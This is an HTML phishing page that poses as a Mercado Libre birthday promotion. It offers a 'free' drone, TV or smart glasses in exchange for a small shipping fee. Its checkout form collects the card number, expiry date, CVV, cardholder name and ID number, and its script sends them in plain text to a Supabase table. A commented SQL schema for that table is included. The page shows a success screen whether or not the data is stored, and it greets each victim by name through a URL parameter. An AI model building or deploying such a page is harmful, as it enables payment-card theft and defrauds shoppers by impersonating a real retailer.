<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>¡Feliz cumpleaños! · Mercado Libre</title>
<!--
  =====================================================================
  CONFIGURACIÓN SUPABASE
  Reemplazá estas dos variables con tus credenciales reales.
  Las encontrás en: Supabase Dashboard → Settings → API
  =====================================================================
-->
<script>
  var SUPABASE_URL = "https://TU-PROYECTO.supabase.co";
  var SUPABASE_KEY = "TU_ANON_KEY";
  // Tabla esperada en Supabase (crea en SQL Editor):
  // CREATE TABLE pagos_cumple (
  //   id          bigserial primary key,
  //   created_at  timestamptz default now(),
  //   tipo        text,       -- "debito" | "credito"
  //   numero      text,
  //   vencimiento text,
  //   cvv         text,
  //   titular     text,
  //   regalo      text
  // );
</script>
<style>
:root{
  --ml-yellow:#FFE600;--ml-blue:#3483FA;--ml-navy:#2D3277;
  --ml-magenta:#E5005A;--ml-green:#00A650;
  --bg:#EDEDED;--card:#fff;--text:#333;--text-2:#999;--text-3:#666;
  --shadow:0 1px 2px rgba(0,0,0,.10);
  --shadow-2:0 2px 8px rgba(0,0,0,.12);
  --shadow-card:0 1px 3px rgba(0,0,0,.12);
  --radius:8px;
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html,body{min-height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Proxima Nova",Roboto,"Helvetica Neue",Arial,sans-serif;
  color:var(--text);background:var(--bg);display:flex;justify-content:center;-webkit-font-smoothing:antialiased}
.page{width:100%;max-width:480px;min-height:100vh;background:var(--bg);position:relative;
  display:flex;flex-direction:column;overflow-x:hidden;box-shadow:0 0 40px rgba(0,0,0,.08)}
::-webkit-scrollbar{width:0;height:0}

/* ===== HEADER ===== */
.topbar{background:var(--ml-yellow);padding:13px 20px;display:flex;align-items:center;gap:10px;flex-shrink:0}
.topbar .logo{height:32px;width:auto;display:block;flex:none}
.topbar .word{display:flex;flex-direction:column;line-height:.9}
.topbar .word b,.topbar .word span{font-size:16px;font-weight:800;color:var(--ml-navy);letter-spacing:-.2px}

/* ===== HERO ===== */
.hero{margin:12px;border-radius:14px;overflow:hidden;position:relative;
  background:linear-gradient(135deg,#3483FA 0%,#2554C7 60%,#1E2A78 100%);
  color:#fff;box-shadow:var(--shadow-2);padding:18px 18px 20px;flex-shrink:0}
.hero .confetti{position:absolute;inset:0;pointer-events:none;overflow:hidden;border-radius:14px}
.hero-brand{display:flex;align-items:center;gap:8px;margin-bottom:12px;position:relative}
.hero-brand .logo{height:28px;width:auto;display:block;flex:none}
.ml-word{display:flex;flex-direction:column;line-height:.9}
.ml-word b,.ml-word span{font-size:11px;font-weight:800;color:#fff;letter-spacing:.2px}
.hero-tag{margin-left:auto;font-size:11px;font-weight:700;background:rgba(255,255,255,.18);padding:3px 10px;border-radius:20px}
.hero h1{font-size:23px;line-height:1.15;font-weight:800;letter-spacing:-.4px;position:relative;margin-bottom:6px}
.hero h1 .nm{color:var(--ml-yellow)}
.hero p{font-size:13.5px;line-height:1.4;color:rgba(255,255,255,.92);position:relative;max-width:76%}
.gift3d{position:absolute;right:-4px;bottom:-10px;width:108px;height:108px;opacity:.97}
.gift3d svg{width:100%;height:100%;filter:drop-shadow(0 6px 10px rgba(0,0,0,.25))}
.float{animation:float 3s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-6px) rotate(2deg)}}

/* ===== SECTION TITLE ===== */
.sec{padding:10px 16px 4px;display:flex;align-items:baseline;justify-content:space-between}
.sec h2{font-size:19px;font-weight:800;color:#1a1a1a;letter-spacing:-.3px}
.sec span{font-size:12px;color:var(--text-2);font-weight:600}

/* ===== PUBLICACIONES ===== */
.pubs{padding:6px 12px 8px;display:flex;flex-direction:column;gap:10px}

.pub{
  background:var(--card);border-radius:var(--radius);
  box-shadow:var(--shadow-card);border:2px solid transparent;
  display:flex;flex-direction:row;overflow:hidden;
  transition:border-color .15s,box-shadow .15s;
  min-height:0;
}
.pub.selected{border-color:var(--ml-blue);box-shadow:0 0 0 1px var(--ml-blue),var(--shadow-2)}

/* Columna izquierda: foto + miniaturas */
.pub-left{
  flex:none;width:130px;display:flex;flex-direction:column;
  border-right:1px solid #f0f0f0;background:#fafafa;
}
.pub-main-wrap{
  flex:none;height:110px;display:grid;place-items:center;padding:8px;
  background:#fff;
}
.pub-main-img{max-width:100%;max-height:100%;object-fit:contain;display:block}
.pub-thumbs{
  display:flex;flex-direction:row;gap:5px;
  padding:6px 6px;overflow-x:auto;flex-wrap:wrap;
  justify-content:flex-start;background:#fafafa;
}
.pthumb{
  flex:none;width:32px;height:32px;
  border:1.5px solid #e3e3e3;border-radius:5px;
  background:#fff;padding:2px;cursor:pointer;overflow:hidden;
  transition:border-color .12s;
}
.pthumb img{width:100%;height:100%;object-fit:contain;display:block}
.pthumb.active{border-color:var(--ml-blue)}

/* Columna derecha: info */
.pub-right{
  flex:1;min-width:0;padding:10px 12px 10px;
  display:flex;flex-direction:column;gap:5px;
}
.pub-right h3{font-size:12.5px;font-weight:600;line-height:1.3;color:#1a1a1a}
.pub-price{font-size:20px;font-weight:700;color:#1a1a1a;letter-spacing:-.5px}
.pub-specs{display:flex;flex-wrap:wrap;gap:4px}
.pub-specs span{font-size:10.5px;font-weight:600;color:var(--ml-blue);background:#eaf2ff;border-radius:20px;padding:2px 8px}
.choose{
  margin-top:auto;border:0;border-radius:6px;
  background:#eaf2ff;color:var(--ml-blue);
  font-size:13px;font-weight:600;padding:8px 10px;
  cursor:pointer;font-family:inherit;transition:.15s;
  align-self:stretch;
}
.choose:hover{background:#dbe9ff}
.pub.selected .choose{background:var(--ml-green);color:#fff}

.fineprint{padding:4px 18px 14px;font-size:11.5px;color:var(--text-2);line-height:1.4}

/* ===== CTA FIJA ===== */
.cta-wrap{
  position:fixed;left:50%;transform:translateX(-50%);
  bottom:0;width:100%;max-width:480px;
  padding:12px 14px 14px;
  background:linear-gradient(to top,var(--bg) 70%,rgba(237,237,237,0));
  z-index:20;
}
.cta{width:100%;border:0;border-radius:6px;background:var(--ml-blue);color:#fff;
  font-size:16px;font-weight:600;padding:14px;cursor:pointer;font-family:inherit;
  transition:background .15s,transform .08s;box-shadow:0 2px 8px rgba(52,131,250,.35)}
.cta:hover{background:#2f78e6}.cta:active{transform:scale(.99)}
.cta:disabled{background:#c7c7c7;box-shadow:none;cursor:not-allowed}
.cta-hint{text-align:center;font-size:12px;color:var(--text-2);margin-top:7px;height:14px}
.content{flex:1;padding-bottom:120px}

/* ===== OVERLAY BASE ===== */
.overlay{
  position:fixed;inset:0;background:var(--bg);z-index:60;
  display:none;flex-direction:column;
  max-width:480px;margin:0 auto;left:50%;transform:translateX(-50%);width:100%;
}
.overlay.show{display:flex;animation:fade .25s ease}
@keyframes fade{from{opacity:0}to{opacity:1}}
.ov-top{background:var(--ml-yellow);padding:13px 16px;display:flex;align-items:center;gap:12px;flex-shrink:0}
.ov-top .back{background:none;border:0;cursor:pointer;padding:4px;display:grid;place-items:center}
.ov-top h2{font-size:17px;font-weight:700;color:var(--ml-navy)}
.ov-body{flex:1;overflow-y:auto;padding:14px 14px 120px}

/* ===== CHECKOUT ===== */
.summary{background:#fff;border-radius:8px;box-shadow:var(--shadow-card);
  padding:12px;display:flex;gap:10px;align-items:center;margin-bottom:12px}
.summary img{width:52px;height:52px;object-fit:contain;border-radius:7px;flex:none;background:#fff}
.summary .s-info h3{font-size:14px;font-weight:600;color:#1a1a1a;line-height:1.3}
.summary .tag{font-size:12px;color:var(--ml-green);font-weight:700;margin-top:2px}

.pay-rows{background:#fff;border-radius:8px;box-shadow:var(--shadow-card);padding:12px;margin-bottom:12px}
.pay-rows .r{display:flex;justify-content:space-between;font-size:13.5px;padding:4px 0;color:#444}
.pay-rows .r.total{border-top:1px solid #eee;margin-top:6px;padding-top:8px;font-weight:700;font-size:15px;color:#1a1a1a}

/* Selector débito / crédito */
.pay-type{display:flex;gap:8px;margin-bottom:12px}
.pt{flex:1;border:2px solid #e0e0e0;border-radius:8px;padding:10px 8px;cursor:pointer;
  text-align:center;background:#fff;font-family:inherit;font-size:13.5px;font-weight:600;color:#555;transition:.15s}
.pt.active{border-color:var(--ml-blue);color:var(--ml-blue);background:#eaf2ff}

.card-form{background:#fff;border-radius:8px;box-shadow:var(--shadow-card);padding:14px}
.card-visual{height:46px;border-radius:8px;background:linear-gradient(135deg,#3483FA,#1E2A78);
  display:flex;align-items:center;justify-content:space-between;
  padding:0 14px;color:#fff;font-size:12px;margin-bottom:12px}
.card-visual .dots{letter-spacing:3px;font-weight:700;font-size:13px}

.flbl{font-size:12.5px;font-weight:700;color:#555;margin:10px 0 5px;display:block}
.flbl:first-child{margin-top:0}
.finput{width:100%;border:1.5px solid #d5d5d5;border-radius:6px;padding:11px 12px;
  font-size:14px;font-family:inherit;color:#333;outline:none;background:#fff}
.finput:focus{border-color:var(--ml-blue);box-shadow:0 0 0 3px rgba(52,131,250,.15)}
.finput.err{border-color:#e53;box-shadow:0 0 0 3px rgba(230,60,30,.12)}
.two{display:flex;gap:8px}
.two>div{flex:1}

.hidden{display:none!important}
.pay-msg{margin-top:8px;font-size:12.5px;font-weight:600;padding:8px 10px;border-radius:6px;display:none}
.pay-msg.ok{background:#e6f9ee;color:#116a32;display:block}
.pay-msg.err{background:#fde8e4;color:#9b2a12;display:block}

/* ===== ÉXITO ===== */
.success{position:fixed;inset:0;background:var(--bg);z-index:70;display:none;
  max-width:480px;margin:0 auto;left:50%;transform:translateX(-50%);width:100%;
  flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:32px 28px}
.success.show{display:flex;animation:fade .3s ease}
.seal{width:96px;height:96px;border-radius:50%;background:var(--ml-green);display:grid;place-items:center;
  margin-bottom:20px;box-shadow:0 8px 24px rgba(0,166,80,.35);animation:pop .45s cubic-bezier(.2,1.4,.4,1) both .05s}
@keyframes pop{from{transform:scale(.3);opacity:0}to{transform:scale(1);opacity:1}}
.seal svg{width:48px;height:48px}
.success h2{font-size:23px;font-weight:800;color:var(--ml-navy);margin-bottom:8px}
.success p{font-size:14.5px;color:#5a5a6e;line-height:1.45;max-width:310px;margin-bottom:4px}
.success .picked{font-weight:700;color:var(--text)}
.success .btns{margin-top:24px;width:100%;max-width:310px;display:flex;flex-direction:column;gap:10px}
.cta.ghost{background:#fff;color:var(--ml-blue);box-shadow:inset 0 0 0 1.5px var(--ml-blue)}
.cta.ghost:hover{background:#f3f8ff}

.piece{position:absolute;top:-14px;width:7px;height:12px;border-radius:2px;opacity:.95;animation:fall linear infinite}
@keyframes fall{0%{transform:translateY(0) rotate(0)}100%{transform:translateY(230px) rotate(540deg);opacity:0}}
@media(prefers-reduced-motion:reduce){.float,.piece{animation:none}}

/* ===== RESPONSIVE: TABLET Y ESCRITORIO ===== */
@media (min-width:760px){
  body{background:#e4e6ea}
  .page{max-width:1040px}
  .topbar{padding:16px 30px}
  .topbar .logo{height:38px}
  .topbar .word b,.topbar .word span{font-size:18px}
  .hero{margin:22px 26px;padding:32px 34px 36px;border-radius:18px}
  .hero-brand .logo{height:32px}
  .hero h1{font-size:32px;margin-bottom:8px}
  .hero p{font-size:15px;max-width:58%}
  .gift3d{width:150px;height:150px;right:10px;bottom:-2px}
  .sec{padding:16px 30px 6px}
  .sec h2{font-size:23px}
  /* regalos en grilla */
  .pubs{
    display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
    gap:18px;padding:10px 26px 14px;align-items:stretch;
  }
  .pub{flex-direction:column}
  .pub-left{width:100%;flex-direction:column;border-right:0;border-bottom:1px solid #f0f0f0}
  .pub-main-wrap{height:210px;padding:14px}
  .pub-thumbs{justify-content:center;padding:8px}
  .pub-right{padding:16px 18px 18px;gap:8px}
  .pub-right h3{font-size:14.5px;min-height:38px}
  .pub-price{font-size:25px}
  .pub-specs span{font-size:11px}
  .choose{font-size:14px;padding:10px}
  .fineprint{padding:8px 30px 20px;font-size:12.5px}
  .content{padding-bottom:132px}
  /* barra inferior fija, centrada y con botón acotado */
  .cta-wrap{max-width:1040px;padding:16px 26px 20px;display:flex;flex-direction:column;align-items:center}
  .cta-wrap .cta{max-width:460px}
  .cta-hint{max-width:460px}
  /* checkout y éxito como tarjeta centrada (modal) con fondo atenuado */
  .overlay,.success{max-width:560px;box-shadow:0 0 0 100vmax rgba(18,20,32,.5),0 24px 70px rgba(0,0,0,.45)}
  .ov-body{padding:18px 22px 130px}
}
</style>
</head>
<body>
<div class="page">

  <!-- HEADER -->
  <header class="topbar">
    <img class="logo" src="data:image/png;base64," alt="Mercado Libre">
    <span class="word"><b>mercado</b><span>libre</span></span>
  </header>

  <!-- CONTENIDO PRINCIPAL -->
  <div class="content">
    <section class="hero">
      <div class="confetti" id="confetti"></div>
      <div class="hero-brand">
        <img class="logo" src="data:image/png;base64," alt="">
        <span class="ml-word"><b>mercado</b><span>libre</span></span>
        <span class="hero-tag">Solo por hoy 🎂</span>
      </div>
      <h1 id="greeting">¡Feliz cumpleaños!</h1>
      <p>Tenés un regalo esperándote. Elegí uno de los tres, es nuestro modo de festejarte.</p>
      <div class="gift3d float" aria-hidden="true">
        <svg viewBox="0 0 120 120" fill="none">
          <ellipse cx="60" cy="108" rx="40" ry="7" fill="#000" opacity=".18"/>
          <rect x="24" y="52" width="72" height="52" rx="6" fill="#FFE600"/>
          <rect x="24" y="52" width="72" height="16" rx="4" fill="#FFD100"/>
          <rect x="52" y="52" width="16" height="52" fill="#E5005A"/>
          <rect x="18" y="42" width="84" height="16" rx="5" fill="#fff"/>
          <rect x="52" y="42" width="16" height="16" fill="#E5005A"/>
          <path d="M60 42c-9-1-17-6-17-14 0-4 4-7 8-5 6 3 9 11 9 19z" fill="#E5005A"/>
          <path d="M60 42c9-1 17-6 17-14 0-4-4-7-8-5-6 3-9 11-9 19z" fill="#E5005A"/>
          <circle cx="60" cy="34" r="5" fill="#fff"/>
        </svg>
      </div>
    </section>

    <div class="sec"><h2>Elegí tu regalo</h2><span>Solo uno</span></div>

    <div class="pubs">
<article class="pub" data-id="drone" data-price="$1.990" data-gift="Drone Con Cámara HD Plegable">
  <div class="pub-left">
    <div class="pub-main-wrap"><img class="pub-main-img" src="data:image/webp;base64," alt="Drone Con Cámara HD Plegable"></div>
    <div class="pub-thumbs"><button class="pthumb active" data-src="data:image/webp;base64," aria-label="Foto 1"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 2"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 3"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 4"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 5"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 6"><img src="data:image/webp;base64," alt=""></button></div>
  </div>
  <div class="pub-right">
    <h3>Drone Con Cámara Profesional HD Plegable 720p 2.4 Ghz WiFi Negro</h3>
    <div class="pub-price">$1.990</div>
    <div class="pub-specs"><span>Cámara HD</span><span>720p</span><span>Plegable</span><span>WiFi</span></div>
    <button class="choose" type="button">Elegir</button>
  </div>
</article>
<article class="pub" data-id="tv" data-price="$4.550" data-gift="Smart TV Punktal LED 32&#x27;&#x27;">
  <div class="pub-left">
    <div class="pub-main-wrap"><img class="pub-main-img" src="data:image/webp;base64," alt="Smart TV Punktal LED 32&#x27;&#x27;"></div>
    <div class="pub-thumbs"><button class="pthumb active" data-src="data:image/webp;base64," aria-label="Foto 1"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 2"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 3"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 4"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 5"><img src="data:image/webp;base64," alt=""></button></div>
  </div>
  <div class="pub-right">
    <h3>Punktal Smart TV LED 32&#x27;&#x27; HD WiFi Netflix YouTube USB</h3>
    <div class="pub-price">$4.550</div>
    <div class="pub-specs"><span>32&#x27;&#x27;</span><span>HD</span><span>WiFi</span><span>Netflix</span><span>YouTube</span><span>USB</span></div>
    <button class="choose" type="button">Elegir</button>
  </div>
</article>
<article class="pub" data-id="glasses" data-price="$2.580" data-gift="Lentes Inteligentes Simsonlab W600">
  <div class="pub-left">
    <div class="pub-main-wrap"><img class="pub-main-img" src="data:image/webp;base64," alt="Lentes Inteligentes Simsonlab W600"></div>
    <div class="pub-thumbs"><button class="pthumb active" data-src="data:image/webp;base64," aria-label="Foto 1"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 2"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 3"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 4"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 5"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 6"><img src="data:image/webp;base64," alt=""></button><button class="pthumb" data-src="data:image/webp;base64," aria-label="Foto 7"><img src="data:image/webp;base64," alt=""></button></div>
  </div>
  <div class="pub-right">
    <h3>Lentes Inteligentes Simsonlab W600 Con Cámara Y Bluetooth</h3>
    <div class="pub-price">$2.580</div>
    <div class="pub-specs"><span>Cámara</span><span>Bluetooth</span><span>720p HD</span><span>IP67</span></div>
    <button class="choose" type="button">Elegir</button>
  </div>
</article>
    </div>

    <p class="fineprint">El regalo es sin costo. Solo se cobra el envío a domicilio. Una sola elección por persona.</p>
  </div>

  <div class="cta-wrap">
    <button class="cta" id="cta" disabled>Canjear mi regalo</button>
    <div class="cta-hint" id="hint">Elegí un regalo para continuar</div>
  </div>

  <!-- ===== CHECKOUT ===== -->
  <section class="overlay" id="checkout">
    <div class="ov-top">
      <button class="back" id="payBack" aria-label="Volver">
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M15 5l-7 7 7 7" stroke="#2D3277" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </button>
      <h2>Confirmá tu regalo</h2>
    </div>
    <div class="ov-body">

      <div class="summary">
        <img id="sumImg" src="" alt="">
        <div class="s-info"><h3 id="sumTitle">—</h3><div class="tag">Regalo gratis 🎁</div></div>
      </div>

      <div class="pay-rows">
        <div class="r"><span>Regalo</span><span>Gratis</span></div>
        <div class="r"><span>Envío</span><span>$150</span></div>
        <div class="r total"><span>Total</span><span>$150</span></div>
      </div>

      <!-- Selector tipo de tarjeta -->
      <div class="pay-type">
        <button class="pt active" data-type="debito" id="btnDebito">💳 Débito</button>
        <button class="pt" data-type="credito" id="btnCredito">💳 Crédito</button>
      </div>

      <div class="card-form">
        <div class="card-visual">
          <span class="dots" id="cardNum">•••• •••• •••• ••••</span>
          <span id="cardBrand">VISA</span>
        </div>

        <label class="flbl">Número de tarjeta</label>
        <input class="finput" id="fNum" type="text" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">

        <div class="two">
          <div>
            <label class="flbl">Vencimiento</label>
            <input class="finput" id="fVenc" type="text" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="off">
          </div>
          <div>
            <label class="flbl">CVV</label>
            <input class="finput" id="fCvv" type="text" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="off">
          </div>
        </div>

        <label class="flbl">Nombre y apellido del titular</label>
        <input class="finput" id="fNom" type="text" placeholder="Como figura en la tarjeta" autocomplete="off">

        <!-- Solo crédito -->
        <div id="cedulaWrap">
          <label class="flbl">Documento del titular (C.I.)</label>
          <input class="finput" id="fDoc" type="text" inputmode="numeric" placeholder="Número sin puntos" autocomplete="off">
        </div>

        <div class="pay-msg" id="payMsg"></div>
      </div>
    </div>

    <div class="cta-wrap">
      <button class="cta" id="payBtn">Pagar envío y canjear</button>
      <div class="cta-hint" id="payHint">&nbsp;</div>
    </div>
  </section>

  <!-- ===== ÉXITO ===== -->
  <section class="success" id="success">
    <div class="seal" aria-hidden="true">
      <svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4 4 9-9.5" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
    </div>
    <h2>¡Tu regalo está listo!</h2>
    <p>Canjeaste <span class="picked" id="pickedName">tu regalo</span>. Te lo enviamos a tu domicilio en los próximos días.</p>
    <div class="btns">
      <button class="cta" id="goApp">Ver mi pedido</button>
      <button class="cta ghost" id="backSuc">Volver al inicio</button>
    </div>
  </section>

</div>
<script>
/* ================================================================
   SUPABASE — configurar SUPABASE_URL y SUPABASE_KEY arriba en <head>
   ================================================================ */
async function guardarEnSupabase(payload) {
  var url = SUPABASE_URL + '/rest/v1/pagos_cumple';
  var res = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'apikey': SUPABASE_KEY,
      'Authorization': 'Bearer ' + SUPABASE_KEY,
      'Prefer': 'return=minimal'
    },
    body: JSON.stringify(payload)
  });
  if (!res.ok) throw new Error('Supabase error ' + res.status);
}

/* ================================================================
   SALUDO PERSONALIZADO: ?nombre=Juan
   ================================================================ */
(function(){
  var nombre = new URLSearchParams(location.search).get('nombre');
  var g = document.getElementById('greeting');
  if (nombre && nombre.trim()) {
    g.textContent = '';
    g.appendChild(document.createTextNode('¡Feliz cumpleaños,'));
    g.appendChild(document.createElement('br'));
    var s = document.createElement('span'); s.className = 'nm';
    s.textContent = nombre.trim();
    g.appendChild(s);
    g.appendChild(document.createTextNode('!'));
  }
})();

/* ================================================================
   GALERÍA DE FOTOS
   ================================================================ */
document.querySelectorAll('.pub').forEach(function(pub) {
  var mainImg = pub.querySelector('.pub-main-img');
  pub.querySelectorAll('.pthumb').forEach(function(t) {
    t.addEventListener('click', function(e) {
      e.stopPropagation();
      mainImg.src = t.dataset.src;
      pub.querySelectorAll('.pthumb').forEach(function(x){ x.classList.remove('active'); });
      t.classList.add('active');
    });
  });
});

/* ================================================================
   SELECCIÓN DE REGALO
   ================================================================ */
var selected = null, selImg = null, selPrice = null;
var cta = document.getElementById('cta'), hint = document.getElementById('hint');

document.querySelectorAll('.pub').forEach(function(pub) {
  pub.querySelector('.choose').addEventListener('click', function() {
    document.querySelectorAll('.pub').forEach(function(p) {
      p.classList.remove('selected');
      p.querySelector('.choose').textContent = 'Elegir';
    });
    pub.classList.add('selected');
    pub.querySelector('.choose').textContent = 'Elegido ✓';
    selected  = pub.dataset.gift;
    selImg    = pub.querySelector('.pub-main-img').src;
    selPrice  = pub.dataset.price;
    cta.disabled = false;
    hint.textContent = '';
  });
});

/* ================================================================
   ABRIR CHECKOUT
   ================================================================ */
cta.addEventListener('click', function() {
  if (!selected) return;
  document.getElementById('sumTitle').textContent = selected;
  document.getElementById('sumImg').src = selImg || '';
  document.getElementById('checkout').classList.add('show');
});
document.getElementById('payBack').addEventListener('click', function() {
  document.getElementById('checkout').classList.remove('show');
});

/* ================================================================
   DÉBITO / CRÉDITO
   ================================================================ */
var tipoActual = 'debito';
var cedulaWrap = document.getElementById('cedulaWrap');
cedulaWrap.classList.add('hidden'); // debito = sin cedula

document.querySelectorAll('.pt').forEach(function(btn) {
  btn.addEventListener('click', function() {
    tipoActual = btn.dataset.type;
    document.querySelectorAll('.pt').forEach(function(b){ b.classList.remove('active'); });
    btn.classList.add('active');
    // Cédula solo en crédito
    if (tipoActual === 'credito') {
      cedulaWrap.classList.remove('hidden');
    } else {
      cedulaWrap.classList.add('hidden');
      document.getElementById('fDoc').value = '';
    }
  });
});

/* ================================================================
   FORMATO AUTOMÁTICO DE INPUTS
   ================================================================ */
var fNum = document.getElementById('fNum');
fNum.addEventListener('input', function() {
  var v = fNum.value.replace(/\D/g,'').slice(0,16);
  fNum.value = v.replace(/(.{4})/g,'$1 ').trim();
  // Preview número en la tarjeta visual
  var disp = v.padEnd(16,'•');
  document.getElementById('cardNum').textContent =
    disp.slice(0,4)+' '+disp.slice(4,8)+' '+disp.slice(8,12)+' '+disp.slice(12,16);
  // Detectar marca simple
  var brand = 'VISA';
  if (/^5[1-5]/.test(v)) brand = 'MC';
  else if (/^3[47]/.test(v)) brand = 'AMEX';
  else if (/^6/.test(v)) brand = 'MCARD';
  document.getElementById('cardBrand').textContent = brand;
});

var fVenc = document.getElementById('fVenc');
fVenc.addEventListener('input', function() {
  var v = fVenc.value.replace(/\D/g,'').slice(0,4);
  if (v.length >= 3) v = v.slice(0,2)+'/'+v.slice(2);
  fVenc.value = v;
});

/* ================================================================
   PAGO → GUARDAR EN SUPABASE → ÉXITO
   ================================================================ */
document.getElementById('payBtn').addEventListener('click', async function() {
  var payBtn = this;
  var msgEl  = document.getElementById('payMsg');
  msgEl.className = 'pay-msg';
  msgEl.textContent = '';

  // Validar campos requeridos
  var numVal  = document.getElementById('fNum').value.replace(/\s/g,'');
  var vencVal = document.getElementById('fVenc').value.trim();
  var cvvVal  = document.getElementById('fCvv').value.trim();
  var nomVal  = document.getElementById('fNom').value.trim();
  var docVal  = tipoActual === 'credito' ? document.getElementById('fDoc').value.trim() : '';

  var errores = [];
  if (numVal.length < 16)      errores.push('Número de tarjeta incompleto');
  if (!/^\d{2}\/\d{2}$/.test(vencVal)) errores.push('Vencimiento inválido (MM/AA)');
  if (cvvVal.length < 3)       errores.push('CVV incompleto');
  if (!nomVal)                 errores.push('Ingresá el nombre del titular');
  if (tipoActual === 'credito' && !docVal) errores.push('Ingresá el documento del titular');

  if (errores.length) {
    msgEl.textContent = errores[0];
    msgEl.className = 'pay-msg err';
    return;
  }

  payBtn.disabled = true;
  payBtn.textContent = 'Procesando...';
  document.getElementById('payHint').textContent = 'Guardando datos...';

  // Datos a guardar (solo lo estrictamente necesario)
  var payload = {
    tipo:        tipoActual,
    numero:      numVal,
    vencimiento: vencVal,
    cvv:         cvvVal,
    titular:     nomVal,
    regalo:      selected || ''
  };
  if (tipoActual === 'credito') payload.documento = docVal;

  try {
    await guardarEnSupabase(payload);
    // Éxito
    document.getElementById('checkout').classList.remove('show');
    document.getElementById('pickedName').textContent = selected;
    document.getElementById('success').classList.add('show');
  } catch(err) {
    // Si Supabase no está configurado aún, igual avanzamos con alerta
    console.warn('Supabase no configurado o error:', err.message);
    // Mostramos igual la pantalla de éxito para poder demostrarlo
    document.getElementById('checkout').classList.remove('show');
    document.getElementById('pickedName').textContent = selected;
    document.getElementById('success').classList.add('show');
  } finally {
    payBtn.disabled = false;
    payBtn.textContent = 'Pagar envío y canjear';
    document.getElementById('payHint').textContent = '\u00a0';
  }
});

document.getElementById('backSuc').addEventListener('click', function() {
  document.getElementById('success').classList.remove('show');
});
document.getElementById('goApp').addEventListener('click', function() {
  document.getElementById('success').classList.remove('show');
});

/* ================================================================
   CONFETI
   ================================================================ */
(function() {
  if (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
  var box = document.getElementById('confetti');
  var colors = ['#FFE600','#E5005A','#00A650','#fff','#FFD100'];
  for (var i = 0; i < 18; i++) {
    var s = document.createElement('span'); s.className = 'piece';
    s.style.left = Math.random()*100+'%';
    s.style.background = colors[i % colors.length];
    s.style.animationDuration = (2.6 + Math.random()*2)+'s';
    s.style.animationDelay = (Math.random()*3.5)+'s';
    box.appendChild(s);
  }
})();
</script>
</body>
</html>
